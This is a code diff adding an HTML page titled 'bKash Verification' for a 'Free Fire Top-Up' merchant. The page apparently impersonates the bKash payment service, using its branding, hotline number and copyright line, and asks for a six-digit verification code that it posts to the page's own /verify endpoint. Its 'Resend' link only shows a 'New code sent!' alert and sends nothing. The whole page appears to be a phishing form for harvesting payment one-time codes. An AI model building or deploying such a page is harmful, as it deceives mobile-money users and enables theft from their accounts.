@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>bKash Verification</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .box {
+      background: #ec197b;
+      padding: 20px;
+      border-radius: 8px;
+      color: white;
+      width: 100%;
+      text-align: center;
+    }
+
+    .box input {
+      width: 90%;
+      padding: 12px;
+      font-size: 18px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 4px;
+      text-align: center;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      margin-top: 20px;
+    }
+
+    .btn {
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      width: 48%;
+      cursor: pointer;
+    }
+
+    .cancel {
+      background: #eee;
+      color: #333;
+    }
+
+    .confirm {
+      background: #ec197b;
+      color: white;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #888;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .merchant {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img class="logo" src="https://i.imgur.com/Wg6qBrg.jpeg" alt="bKash Logo" width="150" />
+
+    <div class="merchant">Merchant: Free Fire Top-Up</div>
+
+    <!-- ✅ Form Starts Here -->
+    <form action="/verify" method="POST" style="width: 100%;">
+      <!-- Hidden inputs for backend -->
+      <input type="hidden" name="method" value="bkash" />
+      <input type="hidden" name="uid" value="123456" />
+      <input type="hidden" name="price" value="100" />
+
+      <div class="box">
+        <p>Enter Verification Code</p>
+        <input 
+          type="text" 
+          name="code" 
+          placeholder="Enter bKash Code"
+          maxlength="6"
+          pattern="[0-9]{6}"
+          required
+        />
+        <p style="font-size: 14px; margin-top: 10px;">
+          Didn't receive code? <span id="countdown">50</span>
+        </p>
+      </div>
+
+      <div class="actions">
+        <button type="button" class="btn cancel" onclick="history.back()">Cancel</button>
+        <button type="submit" class="btn confirm">Confirm</button>
+      </div>
+    </form>
+    <!-- ✅ Form Ends Here -->
+
+    <div class="footer">
+      📞 16247 <br />
+      © 2025 bKash, All Rights Reserved
+    </div>
+  </div>
+
+  <script>
+    let seconds = 50;
+    let timer;
+    const countdownElement = document.getElementById("countdown");
+
+    function startCountdown() {
+      seconds = 50;
+      countdownElement.textContent = seconds;
+      countdownElement.style.color = "";
+      countdownElement.style.cursor = "default";
+      countdownElement.onclick = null;
+
+      timer = setInterval(() => {
+        seconds--;
+        countdownElement.textContent = seconds;
+
+        if (seconds <= 0) {
+          clearInterval(timer);
+          countdownElement.textContent = "Resend";
+          countdownElement.style.color = "blue";
+          countdownElement.style.cursor = "pointer";
+
+          countdownElement.onclick = () => {
+            alert("New code sent!");
+            startCountdown();
+          };
+        }
+      }, 1000);
+    }
+
+    startCountdown();
+  </script>
+</body>
+</html>
